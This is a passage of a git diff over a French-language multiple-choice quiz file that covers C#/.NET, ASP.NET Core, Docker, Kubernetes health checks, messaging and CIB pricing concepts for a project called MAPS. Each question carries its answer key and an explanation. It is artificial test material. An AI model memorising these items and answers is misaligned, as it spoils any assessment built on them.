-      "explanation": "Monte Carlo : N=100 000 simulations, chaque chemin nécessite un tableau de 252 doubles (trading days). Sans ArrayPool : 100 000 × 252 × 8 bytes = 200MB alloués et collectés à chaque pricing → GC pressure → pauses GC → latence imprévisible. Avec `ArrayPool<double>.Shared.Rent(252)` + `Return()` : les buffers sont réutilisés — allocation proche de zéro en régime permanent. Critique en CIB où la latence de pricing doit être déterministe."
+      "answer": "GET doit être safe et sans effet de bord — annuler un trade est une action destructive qui doit utiliser `DELETE /api/v1/booking/{tradeId}` ou `POST /api/v1/booking/{tradeId}/cancel`.",
+      "explanation": "En REST, GET est safe (aucun effet de bord) et idempotent. Un crawler, un outil de monitoring ou un cache qui appelle `GET /api/v1/booking/delete/123` annulerait un trade réel. En CIB, c'est un risque opérationnel majeur. Correct : `DELETE /api/v1/booking/{tradeId}` (si l'annulation est simple et idempotente) ou `POST /api/v1/booking/{tradeId}/cancel` (si l'annulation est une action métier complexe avec état). Les logs réseau (logs applicatifs, proxy access logs) exposeraient aussi l'action dans l'URL — risque d'information leakage."
     },
     {
-      "question": "[Erreur contextuelle] Un développeur appelle `sophisAdapter.GetISIN(internalId)` (appel synchrone, 150ms) directement dans le thread de traitement des requêtes HTTP de l'API de booking. Quel problème ?",
+      "question": "[Terme → Définition] Qu'est-ce que le `CancellationToken` et pourquoi est-il systématiquement passé aux méthodes async dans l'API MAPS ?",
       "options": [
-        "Aucun — 150ms est acceptable.",
-        "Le thread HTTP est bloqué 150ms par requête — à 100 req/sec, 15 threads bloqués en permanence. L'API devient non-scalable et les requêtes s'accumulent. Correction : `await sophisAdapter.GetISINAsync(internalId)`.",
-        "Sophis ne supporte pas les appels depuis ASP.NET Core.",
-        "L'ISIN retourné sera incorrect si l'appel est async."
+        "Un token d'authentification alternatif au JWT pour les appels internes.",
+        "Un mécanisme de coopérative annulation — si le client HTTP ferme la connexion, `HttpContext.RequestAborted` est annulé, propageant l'annulation aux appels SQL/Sophis/Redis pour libérer immédiatement les ressources.",
+        "Un token qui limite la durée d'exécution d'un thread dans `Parallel.For`.",
+        "Un identifiant de corrélation pour tracer les requêtes dans les logs."
       ],
-      "answer": "Le thread HTTP est bloqué 150ms par requête — à 100 req/sec, 15 threads bloqués en permanence. L'API devient non-scalable et les requêtes s'accumulent. Correction : `await sophisAdapter.GetISINAsync(internalId)`.",
-      "explanation": "Thread starvation en ASP.NET Core : le pool de threads HTTP est limité. Un appel synchrone de 150ms monopolise le thread entier. `async/await` libère le thread pendant l'attente I/O — le thread peut traiter d'autres requêtes. Correction complète : `await sophisAdapter.GetISINAsync(id)` + cache Redis pour éviter l'appel Sophis à chaque requête (hit rate > 95% en période de marché)."
+      "answer": "Un mécanisme de coopérative annulation — si le client HTTP ferme la connexion, `HttpContext.RequestAborted` est annulé, propageant l'annulation aux appels SQL/Sophis/Redis pour libérer immédiatement les ressources.",
+      "explanation": "Scénario CIB sans `CancellationToken` : un trader ferme son blotter pendant un calcul de pricing lourd (30s). Le serveur continue de calculer, d'appeler Sophis, d'occuper un thread et une connexion SQL — pour rien. Avec `CancellationToken ct = HttpContext.RequestAborted` propagé : `await _sophisAdapter.GetISINAsync(id, ct)` → l'appel Sophis est annulé immédiatement. `await conn.QueryAsync(sql, ct)` → la commande SQL est interrompue. Les ressources sont libérées. Critique pour la scalabilité en période de marché chargée."
     },
     {
-      "question": "[Définition → Terme] Dans le cadre du refactoring du moteur de pricing, quel principe SOLID garantit qu'ajouter un nouveau modèle (ex: Heston) ne nécessite aucune modification du `PricingEngine` existant ?",
+      "question": "[Caractéristiques → Concept] `Channel<PricingRequest>.CreateBounded(new BoundedChannelOptions(1000) { FullMode = BoundedChannelFullMode.Wait })`. Quel avantage sur `ConcurrentQueue<T>` dans le pipeline de pricing ?",
       "options": [
-        "SRP — Single Responsibility Principle",
-        "OCP — Open/Closed Principle : ouvert à l'extension (nouvelle classe `HestonModel : IPricingModel`), fermé à la modification (PricingEngine inchangé).",
-        "LSP — Liskov Substitution Principle",
-        "DIP — Dependency Inversion Principle"
+        "Channel est plus rapide que ConcurrentQueue dans tous les cas.",
+        "`Channel<T>` bounded intègre la backpressure native — si le channel est plein (1000 messages), le producteur attend automatiquement au lieu de surcharger le système. `ConcurrentQueue` est unbounded et nécessite du polling actif.",
+        "`Channel<T>` est thread-safe, `ConcurrentQueue<T>` ne l'est pas.",
+        "`ConcurrentQueue` ne supporte pas les types génériques complexes."
       ],
-      "answer": "OCP — Open/Closed Principle : ouvert à l'extension (nouvelle classe `HestonModel : IPricingModel`), fermé à la modification (PricingEngine inchangé).",
-      "explanation": "OCP est crucial dans un moteur de pricing CIB : les modèles évoluent (Black-Scholes → Heston → SABR → Bergomi). Sans OCP, chaque nouveau modèle modifie le `PricingEngine` central — risque de régression sur tous les produits existants. Avec `IPricingModel` injectée et OCP : créer `HestonModel : IPricingModel`, enregistrer dans le DI container, zéro modification du moteur. La mission 'refactoring du code' vise exactement cet objectif."
+      "answer": "`Channel<T>` bounded intègre la backpressure native — si le channel est plein (1000 messages), le producteur attend automatiquement au lieu de surcharger le système. `ConcurrentQueue` est unbounded et nécessite du polling actif.",
+      "explanation": "En CIB avec pics de trafic (ouverture des marchés) : sans backpressure, la queue accumule des milliers de pricing requests → mémoire saturée → crash. `Channel<T>` bounded : le controller MAPS `await writer.WriteAsync(request, ct)` — si la capacité est atteinte, l'écriture attend (backpressure naturelle). Le consumer `await foreach (var req in reader.ReadAllAsync())` attend s'il n'y a rien. Comparé à `ConcurrentQueue` : pas de polling (`while(queue.TryDequeue())` qui consomme 100% CPU quand vide), backpressure intégrée, async natif."
     },
     {
-      "question": "[Terme → Définition] Qu'est-ce qu'une dead-letter queue dans RabbitMQ et quel cas d'usage couvre-t-elle en CIB ?",
+      "question": "[Terme → Définition] Dans le contexte Docker de MAPS, quelle est la différence entre un Dockerfile multi-stage et un Dockerfile simple ?",
       "options": [
-        "Une queue pour les messages urgents à traiter en priorité.",
-        "Une queue de destination pour les messages rejetés ou expirés — un booking échoué (ISIN invalide, limite dépassée) est redirigé vers la DLQ pour analyse et rejeu manuel.",
-        "Une queue archivée pour l'audit réglementaire MiFID II.",
-        "Une queue de backup en cas de panne du broker principal."
+        "Le multi-stage permet de déployer sur plusieurs environnements simultanément.",
+        "Le multi-stage sépare le stage de build (SDK lourd ~900MB) du stage de runtime (ASP.NET runtime ~200MB) — l'image finale ne contient pas les outils de compilation, réduisant la taille et la surface d'attaque.",
+        "Le multi-stage est uniquement nécessaire pour les applications .NET 4.8.",
+        "Le multi-stage active automatiquement le mode release de dotnet."
       ],
-      "answer": "Une queue de destination pour les messages rejetés ou expirés — un booking échoué (ISIN invalide, limite dépassée) est redirigé vers la DLQ pour analyse et rejeu manuel.",
-      "explanation": "En CIB, un message de booking peut échouer pour plusieurs raisons : ISIN introuvable dans Sophis, limite de risque dépassée, timeout de DataSynapse. Sans DLQ, le message serait perdu silencieusement. Avec une DLQ configurée : le message rejeté est routé vers `booking.dead-letter` avec les métadonnées d'erreur. L'équipe support peut analyser, corriger l'anomalie et rejouer le message. Essentiel pour la traçabilité réglementaire."
+      "answer": "Le multi-stage sépare le stage de build (SDK lourd ~900MB) du stage de runtime (ASP.NET runtime ~200MB) — l'image finale ne contient pas les outils de compilation, réduisant la taille et la surface d'attaque.",
+      "explanation": "Multi-stage dans MAPS : `FROM sdk:8.0 AS build` → `dotnet publish` → binaires compilés. `FROM aspnet:8.0 AS runtime` → `COPY --from=build /app .` → uniquement les binaires, pas le SDK. Résultat : image finale ~200MB au lieu de ~900MB. Avantages sécurité : le compilateur, `dotnet-sdk`, les sources ne sont pas dans l'image de production. Si un attaquant pénètre le container, il ne peut pas recompiler du code. Réduction du temps de push/pull dans la CI."
     },
     {
-      "question": "[Caractéristiques → Concept] `Polly.CircuitBreakerAsync(5, TimeSpan.FromSeconds(30))` autour des appels Sophis. Quel problème architectural résout ce pattern ?",
+      "question": "[Erreur contextuelle] Le service de pricing MAPS utilise `HttpContext.Current` pour récupérer l'identité du trader dans une méthode appellée depuis `Parallel.For`. Quel problème ?",
       "options": [
-        "Il améliore les performances des appels Sophis.",
-        "Il évite la cascade de pannes — si Sophis est down, le circuit s'ouvre après 5 erreurs et rejette immédiatement les appels suivants 30s. Le service MAPS reste disponible avec des données dégradées.",
-        "Il compresse les données échangées avec Sophis.",
-        "Il garantit que les appels Sophis sont toujours synchrones."
+        "Aucun — `HttpContext.Current` est accessible depuis tous les threads.",
+        "`HttpContext.Current` est un ambient context stocké en Thread Local Storage du thread de la requête HTTP — les worker threads de `Parallel.For` n'ont pas ce contexte. Retourne null ou le mauvais contexte. Solution : capturer `User.Identity.Name` avant le `Parallel.For` et le passer explicitement.",
+        "Le problème est uniquement de performance — `HttpContext.Current` est lent.",
+        "`HttpContext.Current` n'existe pas dans ASP.NET Core — utiliser `IHttpContextAccessor`."
       ],
-      "answer": "Il évite la cascade de pannes — si Sophis est down, le circuit s'ouvre après 5 erreurs et rejette immédiatement les appels suivants 30s. Le service MAPS reste disponible avec des données dégradées.",
-      "explanation": "Circuit breaker dans un contexte CIB : Sophis/DataSynapse sont des dépendances critiques mais potentiellement instables (redémarrages, maintenances). Sans circuit breaker, chaque appel échoue après son timeout (ex: 5s) — si 100 req/sec, 100 threads bloqués 5s = 500 threads occupés → saturation totale. Avec le circuit breaker : après 5 erreurs, rejet immédiat (< 1ms) pendant 30s → le service reste opérationnel en mode dégradé (fallback sur cache Redis)."
+      "answer": "`HttpContext.Current` est un ambient context stocké en Thread Local Storage du thread de la requête HTTP — les worker threads de `Parallel.For` n'ont pas ce contexte. Retourne null ou le mauvais contexte. Solution : capturer `User.Identity.Name` avant le `Parallel.For` et le passer explicitement.",
+      "explanation": "Bug subtil en CIB : l'audit trail MiFID II nécessite l'identité du trader pour chaque calcul. Si `userId` est null (thread worker sans contexte HTTP), le log est incomplet → non-conformité réglementaire. Solution : `var userId = User.Identity.Name; Parallel.For(0, N, i => { LogPricing(userId, option, greeks[i]); });` — `userId` est capturé sur le thread HTTP, closuré dans le lambda. Note : en ASP.NET Core moderne, `IHttpContextAccessor` est thread-safe via `AsyncLocal` — mais le problème persiste avec `Parallel.For` (threads synchrones, pas async)."
     },
     {
-      "question": "[Terme → Définition] Quelle est la différence entre `.NET Framework 4.8` et `.NET 8` dans le contexte de la mission MAPS, et pourquoi les deux coexistent-ils ?",
+      "question": "[Terme → Définition] Qu'est-ce que le Health Check dans ASP.NET Core et pourquoi est-il indispensable dans une architecture Docker/Kubernetes pour MAPS ?",
       "options": [
-        "Ce sont des versions identiques avec un numéro de build différent.",
-        ".NET Framework 4.8 = Windows uniquement, nécessaire pour Sophis COM et MSMQ legacy. .NET 8 = cross-platform, performant, pour les nouveaux services REST API. Coexistence pendant la migration progressive.",
-        ".NET 8 ne supporte pas SQL Server.",
-        ".NET Framework 4.8 est uniquement pour les tests, .NET 8 pour la production."
+        "Un endpoint de diagnostic uniquement pour les développeurs.",
+        "Un endpoint `GET /health` standardisé qui vérifie l'état des dépendances (SQL Server, RabbitMQ, Redis, Sophis) — Docker et Kubernetes l'utilisent pour décider si le container est prêt à recevoir du trafic (readiness) ou vivant (liveness).",
+        "Un outil de profiling mémoire intégré à ASP.NET Core.",
+        "Un dashboard de monitoring remplaçant Grafana."
       ],
-      "answer": ".NET Framework 4.8 = Windows uniquement, nécessaire pour Sophis COM et MSMQ legacy. .NET 8 = cross-platform, performant, pour les nouveaux services REST API. Coexistence pendant la migration progressive.",
-      "explanation": "Réalité terrain en CIB : Sophis expose une API COM (Windows uniquement) et MSMQ est natif .NET Framework. Impossible de migrer en un coup. La stratégie multi-target (`<TargetFrameworks>net48;net8.0</TargetFrameworks>`) compile les deux versions. Les abstractions (`ISophisAdapter`) permettent d'isoler le code .NET Framework 4.8 derrière une interface — le reste du service tourne en .NET 8. La mission mentionne explicitement les deux versions."
+      "answer": "Un endpoint `GET /health` standardisé qui vérifie l'état des dépendances (SQL Server, RabbitMQ, Redis, Sophis) — Docker et Kubernetes l'utilisent pour décider si le container est prêt à recevoir du trafic (readiness) ou vivant (liveness).",
+      "explanation": "Dans MAPS containerisé : `GET /health/live` (liveness) = le process tourne. `GET /health/ready` (readiness) = SQL Server accessible + RabbitMQ connecté + Sophis répond + Redis disponible. Kubernetes envoie du trafic seulement si readiness = OK. Si readiness échoue (Sophis en maintenance), le pod est retiré du load balancer sans être tué. Si liveness échoue (deadlock dans l'application), le pod est redémarré. Sans health checks : Kubernetes envoie du trafic vers un pod dont la DB est down → 500 errors pour les traders."
     },
     {
-      "question": "[Erreur contextuelle] Un développeur déclare `public Dictionary<string, decimal> VolCache = new Dictionary<string, decimal>();` comme champ statique public dans le service de pricing C# multithreadé. Quelles violations ?",
+      "question": "[Terme → Définition] Quelle est la différence entre `record`, `class` et `struct` en C# pour modéliser les entités dans MAPS ?",
       "options": [
-        "Aucune violation — static est plus performant.",
-        "Race condition (Dictionary non thread-safe sous lectures/écritures concurrentes) + Encapsulation rompue (public mutable) + Singleton mal contrôlé. Correction : `private readonly ConcurrentDictionary<string, decimal> _volCache`.",
-        "Seul problème : le champ aurait dû être `readonly`.",
-        "La performance est insuffisante — utiliser `Hashtable` à la place."
+        "Ce sont des mots-clés identiques avec des noms différents.",
+        "`record` = immutable par défaut, égalité structurelle, idéal pour DTOs (BookingRequest, GreeksDto). `class` = mutable, référence, cycle de vie, pour les entités avec état (PricingContext). `struct` = type valeur sur la stack, léger, pour les petits agrégats numériques (Greeks, Point).",
+        "`struct` est obsolète en .NET 8 — utiliser uniquement `record`.",
+        "`record` ne peut pas implémenter d'interfaces en C# 12."
       ],
-      "answer": "Race condition (Dictionary non thread-safe sous lectures/écritures concurrentes) + Encapsulation rompue (public mutable) + Singleton mal contrôlé. Correction : `private readonly ConcurrentDictionary<string, decimal> _volCache`.",
-      "explanation": "3 violations critiques en CIB multithreadé : (1) `Dictionary<K,V>` : sous `Parallel.ForEach`, les lectures/écritures concurrentes corrompent la structure interne → exception ou données silencieusement incorrectes. Solution : `ConcurrentDictionary`. (2) `public` mutable : n'importe quel service modifie le cache directement. (3) `static` : cycle de vie non contrôlé. Sur un desk options, une volatilité corrompue dans le cache signifie des prix incorrects → pertes potentielles."
+      "answer": "`record` = immutable par défaut, égalité structurelle, idéal pour DTOs (BookingRequest, GreeksDto). `class` = mutable, référence, cycle de vie, pour les entités avec état (PricingContext). `struct` = type valeur sur la stack, léger, pour les petits agrégats numériques (Greeks, Point).",
+      "explanation": "Choix dans MAPS : `record BookingRequest(string ISIN, decimal Notional, DateTime Maturity)` — DTO immuable, sérializable JSON, `with` expression pour les copies modifiées. `class PricingContext` — cycle de vie géré par DI, state mutable pendant le calcul. `readonly struct Greeks { decimal Delta, Gamma, Vega, Theta, Rho; }` — 5 décimales = 80 bytes, allocé sur la stack, pas de pression GC. Sur un book de 1000 options avec Greeks calculés en parallèle, `struct` évite 1000 allocations heap."
     },
     {
-      "question": "[Terme → Définition] Qu'est-ce que Sophis RISQUE dans l'environnement CIB de la mission MAPS et quel rôle joue-t-il ?",
+      "question": "[Terme → Définition] Qu'est-ce que ProblemDetails (RFC 7807) et pourquoi standardise-t-il les réponses d'erreur dans l'API MAPS ?",
       "options": [
-        "Un outil de CI/CD pour déployer les services de pricing.",
-        "Un référentiel de marché et de positions pour les dérivés — stocke les instruments (ISIN, strike, maturité), les trades bookés et les données de marché. Source de vérité pour le service de récupération d'ISIN.",
-        "Un framework de tests pour les modèles de pricing C#.",
-        "Un protocole de messaging pour remplacer RabbitMQ."
+        "Un format de log structuré pour Serilog.",
+        "Un format JSON standardisé pour les réponses d'erreur API : `{ type, title, status, detail, correlationId }` — tous les clients (OMS, blotter) parsent la même structure quelle que soit l'erreur.",
+        "Une bibliothèque de validation des inputs alternatif à FluentValidation.",
+        "Un standard pour documenter les endpoints dans Swagger/OpenAPI."
       ],
-      "answer": "Un référentiel de marché et de positions pour les dérivés — stocke les instruments (ISIN, strike, maturité), les trades bookés et les données de marché. Source de vérité pour le service de récupération d'ISIN.",
-      "explanation": "Sophis RISQUE (maintenant Finastra) est un PGRM (Progiciel de Gestion des Risques de Marché) standard en CIB pour les dérivés. Il centralise : le référentiel d'instruments (chaque option a un ISIN dans Sophis), les positions courantes, les données de marché (spots, vols, taux). Le service de récupération d'ISIN de la mission interroge Sophis via son API COM/C# pour résoudre un identifiant interne en ISIN standard."
+      "answer": "Un format JSON standardisé pour les réponses d'erreur API : `{ type, title, status, detail, correlationId }` — tous les clients (OMS, blotter) parsent la même structure quelle que soit l'erreur.",
+      "explanation": "Sans ProblemDetails : l'OMS reçoit parfois `{ error: \"invalid\" }`, parfois `{ message: \"ISIN not found\" }`, parfois une stack trace — le client doit gérer chaque format différemment. Avec ProblemDetails : toujours `{ type: \"https://maps.bnp/errors/isin-not-found\", title: \"ISIN Not Found\", status: 404, detail: \"ISIN FR0000131104 does not exist in Sophis\", correlationId: \"abc-123\" }`. Les clients ont un parser unique. Le `correlationId` permet de corréler l'erreur côté client avec le log serveur. `services.AddProblemDetails()` + `app.UseExceptionHandler()` active ce comportement globalement."
     },
     {
-      "question": "[Terme → Définition] Dans Azure DevOps, quelle est la différence entre CI (Continuous Integration) et CD (Continuous Deployment) dans le pipeline MAPS ?",
+      "question": "[Erreur contextuelle] Dans le Dockerfile de MAPS, un développeur fait `COPY . . ` avant `RUN dotnet restore`. Quel problème de CI performance ?",
       "options": [
-        "CI et CD sont deux noms pour la même chose.",
-        "CI = build + tests automatisés déclenchés à chaque commit. CD = déploiement automatique en staging/production si CI passe. Pipeline complet : commit → CI → artefacts → CD → environnement.",
-        "CI est pour les tests, CD est pour la documentation.",
-        "CI nécessite TFS, CD nécessite Azure DevOps — ils ne peuvent pas coexister."
+        "Aucun — l'ordre des instructions Docker n'a pas d'importance.",
+        "Docker invalide le cache de la couche `dotnet restore` à chaque changement de code source — même si `*.csproj` n'a pas changé. Correct : `COPY *.csproj .` → `RUN dotnet restore` → `COPY . .` → `RUN dotnet build`.",
+        "Le problème est que `COPY . .` copie les fichiers de test dans l'image de production.",
+        "`COPY . .` avant restore fait que NuGet ne trouve pas les packages."
       ],
-      "answer": "CI = build + tests automatisés déclenchés à chaque commit. CD = déploiement automatique en staging/production si CI passe. Pipeline complet : commit → CI → artefacts → CD → environnement.",
-      "explanation": "Dans le contexte MAPS (mention explicite Azure DevOps dans la mission) : CI garantit que chaque commit ne casse pas le build ni les tests — détection immédiate des régressions. CD automatise le déploiement des artefacts validés vers les environnements (UAT, production). La mention 'bases des pipeline Azure DevOps et MAPS' indique une connaissance attendue des deux. TFS est l'ancienne version on-premise, Azure DevOps est le successeur cloud."
+      "answer": "Docker invalide le cache de la couche `dotnet restore` à chaque changement de code source — même si `*.csproj` n'a pas changé. Correct : `COPY *.csproj .` → `RUN dotnet restore` → `COPY . .` → `RUN dotnet build`.",
+      "explanation": "Docker layer cache : chaque instruction est une couche cachée. Si la couche précédente change, toutes les couches suivantes sont invalidées. `COPY . .` → inclut tous les `.cs` → change à chaque commit → `dotnet restore` re-télécharge tous les NuGet packages à chaque build CI (2-5 minutes). Optimisation : copier seulement les fichiers de project (`.csproj`, `.sln`) d'abord → restore NuGet (couche stable, cachée) → copier les sources → build. En pratique : build CI passe de 5 minutes à 30 secondes."
     },
     {
-      "question": "[Caractéristiques → Concept] Un book d'options avec 500 instruments est revalurisé avec `Parallel.ForEach(book, opt => results.Add(opt.Price(md)))`. Pourquoi `ConcurrentBag<decimal>` est-il nécessaire à la place de `List<decimal>` ?",
+      "question": "[Terme → Définition] Qu'est-ce que le pattern `IHostedService` dans ASP.NET Core et quel rôle joue-t-il dans MAPS ?",
       "options": [
-        "`ConcurrentBag` est plus rapide que `List` dans tous les cas.",
-        "`List<decimal>` n'est pas thread-safe — des ajouts simultanés corrompent la structure interne. `ConcurrentBag<decimal>` garantit des ajouts thread-safe sous `Parallel.ForEach`.",
-        "`List<decimal>` ne supporte pas les types `decimal` en mode parallèle.",
-        "`ConcurrentBag` maintient l'ordre des éléments, `List` non."
+        "Un service HTTP hébergé dans ASP.NET Core pour les endpoints externes.",
+        "Un service background qui tourne en parallèle de l'API — utilisé dans MAPS pour le consumer RabbitMQ, le cache warming ISIN au démarrage, et le polling DataSynapse pour les jobs terminés.",
+        "Un service qui remplace le Kestrel web server dans les applications containerisées.",
+        "Un service de monitoring des health checks en temps réel."
       ],
-      "answer": "`List<decimal>` n'est pas thread-safe — des ajouts simultanés corrompent la structure interne. `ConcurrentBag<decimal>` garantit des ajouts thread-safe sous `Parallel.ForEach`.",
-      "explanation": "`List<T>` : `Add()` n'est pas atomique (resize interne, index non synchronisé). Sous `Parallel.ForEach` : deux threads qui `Add()` simultanément peuvent écrire au même index ou corrompre le resize. `ConcurrentBag<T>` utilise des structures lock-free adaptées au producteur/consommateur multi-thread. Attention : `ConcurrentBag` ne garantit pas l'ordre — si l'ordre importait (pour associer option[i] à result[i]), utiliser un tableau pré-alloué `decimal[] results = new decimal[book.Count]` et indexer par `i`."
+      "answer": "Un service background qui tourne en parallèle de l'API — utilisé dans MAPS pour le consumer RabbitMQ, le cache warming ISIN au démarrage, et le polling DataSynapse pour les jobs terminés.",
+      "explanation": "`IHostedService` / `BackgroundService` tourne dans le même process que l'API. Dans MAPS : (1) `RabbitMqConsumerService : BackgroundService` — `ExecuteAsync` boucle sur `channel.BasicConsumeAsync()`, traite les messages de pricing de façon continue. (2) `CacheWarmingService : IHostedService` — au démarrage (`StartAsync`), précharge les 1000 ISIN les plus fréquents dans Redis. (3) `DataSynapsePollingService` — vérifie les jobs terminés toutes les 2s. `services.AddHostedService<RabbitMqConsumerService>()` — DI gère le cycle de vie."
     },
     {
-      "question": "[Erreur contextuelle] Dans un pipeline Azure DevOps, un développeur commit directement sur `main` sans passer par une Pull Request. Quel problème dans un contexte CIB ?",
+      "question": "[Terme → Définition] Dans le contexte microservices de MAPS, quelle est la différence entre un API Gateway et un reverse proxy comme YARP ?",
       "options": [
-        "Aucun problème — commit direct est plus rapide.",
-        "Absence de code review (risque de bug en production), contournement des tests CI obligatoires, violation des politiques de ségrégation des rôles imposées par la compliance bancaire.",
-        "Le pipeline Azure DevOps ne supporte pas les commits directs sur main.",
-        "La seule contrainte est qu'il faut un build tag sur le commit."
+        "Ce sont des termes identiques pour le même composant.",
+        "Un reverse proxy (YARP) route les requêtes vers les services. Un API Gateway est un reverse proxy enrichi : authentification centralisée, rate limiting, transformation des requêtes, agrégation de plusieurs appels en un seul.",
+        "YARP est uniquement utilisé pour le load balancing, l'API Gateway pour la sécurité.",
+        "L'API Gateway est obligatoirement externe (AWS, Azure), YARP est interne."
       ],
-      "answer": "Absence de code review (risque de bug en production), contournement des tests CI obligatoires, violation des politiques de ségrégation des rôles imposées par la compliance bancaire.",
-      "explanation": "En CIB, les politiques de développement sont strictes pour des raisons réglementaires (SOX, MiFID II) : les branches protégées sur `main` exigent une PR avec approbation, les tests CI doivent passer, et il doit y avoir une ségrégation entre le développeur et l'approbateur. Un bug direct en production sur un service de booking peut générer des trades incorrects — impact financier et réglementaire. Azure DevOps Branch Policies enforce ces règles : minimum reviewers, build validation obligatoire."
+      "answer": "Un reverse proxy (YARP) route les requêtes vers les services. Un API Gateway est un reverse proxy enrichi : authentification centralisée, rate limiting, transformation des requêtes, agrégation de plusieurs appels en un seul.",
+      "explanation": "Dans MAPS microservices : YARP (Yet Another Reverse Proxy, Microsoft C#) peut jouer les deux rôles. Comme reverse proxy simple : `routes → clusters` dans `appsettings.json`, route `/api/v1/booking/*` vers `BookingService:5001`. Comme API Gateway : ajouter middleware JWT validation centralisé (tous les services n'ont plus à valider le token), rate limiting global, logging centralisé des requêtes, transformation des headers (injecter `X-User-Id` résolu depuis le JWT). L'API Gateway est le seul point d'entrée du réseau privé microservices."
     },
     {
-      "question": "[Terme → Définition] Qu'est-ce que le Vega d'une option et pourquoi est-il particulièrement critique pour un desk de structurés CIB ?",
+      "question": "[Caractéristiques → Concept] `.AsNoTracking()` dans une requête EF Core sur le référentiel d'instruments. Quel avantage dans le contexte read-heavy de MAPS ?",
       "options": [
-        "La vitesse d'exécution du calcul de pricing.",
-        "La sensibilité du prix de l'option à la volatilité implicite — un Vega positif signifie que si la vol monte de 1%, le prix de l'option monte d'une valeur égale au Vega.",
-        "Le volume de notionnel en euros du portefeuille d'options.",
-        "La sensibilité au taux d'intérêt à court terme."
+        "Il désactive le cache EF Core pour toujours lire les données fraîches.",
+        "Il désactive le change tracking — EF Core ne maintient pas d'objet DbEntityEntry pour chaque instrument chargé, réduisant la mémoire consommée et le temps de matérialisation pour les requêtes de lecture pure.",
+        "Il permet de lire les données sans transaction SQL.",
+        "Il active la lecture depuis un replica SQL Server au lieu du master."
       ],
-      "answer": "La sensibilité du prix de l'option à la volatilité implicite — un Vega positif signifie que si la vol monte de 1%, le prix de l'option monte d'une valeur égale au Vega.",
-      "explanation": "Le Vega est critique pour les desks de structurés car les autocalls et produits à barrière ont des Vega importants — leur prix est très sensible à la surface de volatilité. Un changement de surface (vol spike, crise de marché) impacte massivement le P&L. Le desk doit monitorer son exposition Vega agrégée et la hedger via des options vanilla. En pré-trade, MAPS calcule le Vega du nouveau deal pour que le trader évalue l'impact sur son book existant."
-    },
-    {
-      "question": "[Terme → Définition] Quelle est la différence entre `IMemoryCache` et `IDistributedCache` dans ASP.NET Core pour le service d'ISIN ?",
-      "options": [
-        "Ce sont deux interfaces identiques avec des noms différents.",
-        "`IMemoryCache` = cache en mémoire locale de l'instance (non partagé). `IDistributedCache` = cache partagé entre toutes les instances (Redis) — nécessaire si plusieurs instances du service de booking tournent en parallèle.",
-        "`IDistributedCache` est plus lent mais plus fiable que `IMemoryCache`.",
-        "`IMemoryCache` nécessite Redis, `IDistributedCache` est local."
-      ],
-      "answer": "`IMemoryCache` = cache en mémoire locale de l'instance (non partagé). `IDistributedCache` = cache partagé entre toutes les instances (Redis) — nécessaire si plusieurs instances du service de booking tournent en parallèle.",
-      "explanation": "En déploiement multi-instance (load balancing) : `IMemoryCache` local → chaque instance a son propre cache ISIN → si l'instance 1 a résolu un ISIN, l'instance 2 doit re-interroger Sophis → appels redondants et incohérences potentielles. `IDistributedCache` (Redis) → toutes les instances partagent le même cache → un seul appel Sophis pour chaque ISIN, même avec 10 instances. En CIB, les services critiques tournent souvent en mode haute disponibilité avec plusieurs instances."
+      "answer": "Il désactive le change tracking — EF Core ne maintient pas d'objet DbEntityEntry pour chaque instrument chargé, réduisant la mémoire consommée et le temps de matérialisation pour les requêtes de lecture pure.",
+      "explanation": "EF Core change tracking : par défaut, chaque entité chargée est enregistrée dans le `ChangeTracker` (snapshot de l'état original, watcher pour les modifications). Sur 10 000 instruments chargés pour le référentiel, cela représente 10 000 objets supplémentaires en mémoire. Avec `.AsNoTracking()` : les objets sont créés directement sans suivi — 2× plus rapide à matérialiser, moitié moins de mémoire. À utiliser systématiquement pour les requêtes de lecture (`GET /instruments`, `GET /greeks`) où on ne modifie pas les entités."
     }
   ],
   avance: [
     {
-      "question": "[Concept → Pattern] Comment implémenter le service `IIsinService` en respectant DIP et en garantissant la testabilité dans le contexte MAPS ?",
+      "question": "[Concept → Architecture] Comment implémenter la gestion de 3 endpoints (booking, pricing, referentiel) avec des middlewares partagés et des configurations d'autorisation différentes dans ASP.NET Core ?",
       "options": [
-        "Instancier directement `new SophisAdapter()` dans le constructeur du service.",
-        "Injecter `ISophisAdapter` par constructeur, implémenter `IIsinService` avec cache-aside, mocker `ISophisAdapter` dans les tests — le service ne connaît pas Sophis directement.",
-        "Accéder à Sophis via un champ statique partagé entre tous les services.",
-        "Utiliser `ServiceLocator.GetService<ISophisAdapter>()` à l'intérieur de la méthode."
+        "Trois controllers séparés avec chacun leur propre pipeline indépendant.",
+        "Pipeline global : `UseRouting → UseAuthentication → UseAuthorization → UseRateLimiting → MapControllers`. Policies par endpoint : `[Authorize(Policy=\"CanBook\")]` sur BookingController, `[Authorize(Policy=\"CanPrice\")]` sur PricingController, `[Authorize]` seul sur ReferentielController. Rate limiting différencié par route.",
+        "Un seul middleware custom qui gère l'auth et le routing manuellement.",
+        "Séparer en 3 applications ASP.NET Core indépendantes avec leurs propres pipelines."
       ],
-      "answer": "Injecter `ISophisAdapter` par constructeur, implémenter `IIsinService` avec cache-aside, mocker `ISophisAdapter` dans les tests — le service ne connaît pas Sophis directement.",
-      "explanation": "DIP appliqué au service ISIN : `public class IsinService : IIsinService { private readonly ISophisAdapter _sophis; private readonly IDistributedCache _cache; public IsinService(ISophisAdapter sophis, IDistributedCache cache) { _sophis = sophis; _cache = cache; } }`. Test unitaire : `new IsinService(Mock<ISophisAdapter>().Object, Mock<IDistributedCache>().Object)` — Sophis n'est pas instancié. La mission 'refactoring du code' vise exactement cette inversion de dépendance pour découpler du Sophis réel."
+      "answer": "Pipeline global : `UseRouting → UseAuthentication → UseAuthorization → UseRateLimiting → MapControllers`. Policies par endpoint : `[Authorize(Policy=\"CanBook\")]` sur BookingController, `[Authorize(Policy=\"CanPrice\")]` sur PricingController, `[Authorize]` seul sur ReferentielController. Rate limiting différencié par route.",
+      "explanation": "Architecture ASP.NET Core : le pipeline middleware est partagé (une seule configuration `Program.cs`). L'ordre est critique : `UseAuthentication` avant `UseAuthorization` (l'identité doit être établie avant de vérifier les droits). Les policies s'appliquent au niveau du controller ou de l'action. Rate limiting différencié : `AddFixedWindowLimiter(\"booking\", ...)` pour le booking (critique), `AddSlidingWindowLimiter(\"pricing\", ...)` pour le pricing (tolérant aux bursts). Chaque endpoint a ses propres contraintes sans dupliquer l'infrastructure."
     },
     {
